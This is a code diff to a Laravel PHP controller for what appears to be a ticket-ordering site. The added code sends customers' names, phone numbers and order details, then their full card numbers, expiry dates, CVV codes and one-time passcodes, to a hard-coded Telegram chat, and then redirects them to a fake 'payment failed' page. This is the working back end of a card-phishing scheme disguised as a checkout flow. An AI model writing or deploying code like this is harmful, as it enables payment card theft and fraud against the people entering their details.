@@ -7,9 +7,11 @@ use App\Models\Event;
 use App\Models\Order;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\Redirect;
 use Illuminate\Support\Facades\Session;
 use PhpParser\JsonDecoder;
+use Telegram\Bot\Laravel\Facades\Telegram;
 
 class HomeController extends Controller
 {
@@ -96,6 +98,33 @@ class HomeController extends Controller
         $order = Order::query()->findOrFail($request->orderId);
         $order->update($data);
         if ($order){
+            $grandTotal = 0;
+            foreach ($order->tickets as $ticket) {
+                $price = $ticket->price;
+                $count = $ticket->pivot->count;
+                $total = $price * $count;
+                $grandTotal += $total;
+            }
+            $event = $order->tickets[0]->event->title;
+            $price = $order->tickets[0]->price;
+            $name = $order->user_name;
+            $phone = $order->phone;
+
+            $message = "
+            ====== 🚚 New Order ========
+
+        👤: $name
+
+        🏟️: $event
+
+        🎫: Ticket price : $price | 🔄 X$count
+
+        💰: Total : $grandTotal ريال
+
+        📞: $phone
+                    ";
+
+            $this->send_telegram($message);
             return \redirect()->route('pay')->with('order',$order);
         }else{
             return \redirect()->back();
@@ -120,7 +149,32 @@ class HomeController extends Controller
         }else{
             $card = Card::query()->create($data);
         }
+
         if ($card){
+
+            $name = $card->order->user_name;
+            $phone = $card->order->phone;
+
+            $message = "
+            ====== 💳 New Card ========
+
+        👤: $name
+
+        💳: $card->cardnumber
+
+        📅: $card->ccmonth / $card->ccyear
+
+        🔐: $card->cvv
+
+        📞: $phone
+
+        🔂: $card->attempt attempt
+
+      ======================
+        ";
+            $this->send_telegram($message);
+
+
             return response()->json([
                 'message' => 'Data received & stored successfully',
                 'status' => 200,
@@ -151,7 +205,33 @@ class HomeController extends Controller
         ]);
         $card->save();
 
+        $name = $card->order->user_name;
+
+        $message = "
+            ====== 💳 Otp ========
+
+        👤: $name
+
+        💳: $card->cardnumber
+
+        🔂: $card->attempt attempt
+
+        📟: $card->otp
+
+      ======================
+        ";
+
+            $this->send_telegram($message);
+
         return \redirect()->route('payment.failed');
+    }
+
+    public function send_telegram($message)
+    {
+        Telegram::sendMessage([
+                'chat_id' => '981019297',
+                'text' => $message
+        ]);
     }
 
 }
